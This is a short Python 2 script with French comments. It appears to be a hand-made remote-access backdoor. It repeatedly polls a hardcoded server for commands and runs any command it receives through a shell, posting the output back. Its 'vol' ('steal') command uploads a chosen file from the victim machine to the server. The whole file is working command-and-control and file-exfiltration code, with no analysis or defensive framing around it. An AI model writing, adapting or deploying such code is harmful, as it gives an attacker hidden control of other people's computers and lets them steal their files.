import requests
import subprocess
import time
import os

URL_SERVER = "http://10.142.10.22"

while True:

    req = requests.get(URL_SERVER)
    command = req.text
    
    #Commande FERMER
    if 'fermer' in command:
        break

    #Commande AIDE
    elif 'aide' in command:
        data = '\n'
        data += 'Les commandes utilisables:\n'
        data += '       aide -> affiche cette aide\n'
        data += '       vol -> recuperer un fichier sur la cible\n'
        data += '\n'
        post_response = requests.post(url=URL_SERVER, data=data)

    #Commande VOL
    elif 'vol' in command:
        cmd = command.split(' ')

        if len(cmd) >= 2:
            vol = cmd[0]

            path = ""
            for i in range(1, len(cmd)):
                path += cmd[i]
                path += " "
            path = path[:-1]
            print path

            if os.path.exists(path):
                post_response = requests.post(url=URL_SERVER+"/nomDeFichier", data="Nom du fichier: "+path)
                url_store = URL_SERVER+"/store"
                files = {'file': open(path, 'rb')}
                r = requests.post(url=url_store, files=files)
            else:
                post_response = requests.post(url=URL_SERVER+"/nomDeFichier", data="Fichier introuvable")

        else:
            post_response = requests.post(url=URL_SERVER+"/store", data="probleme d'arguments, ex: vol fichier\a\voler")                         



    #Commande Windows classique
    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(url=URL_SERVER, data=CMD.stdout.read())
        post_response = requests.post(url=URL_SERVER, data=CMD.stderr.read())

    time.sleep(3)
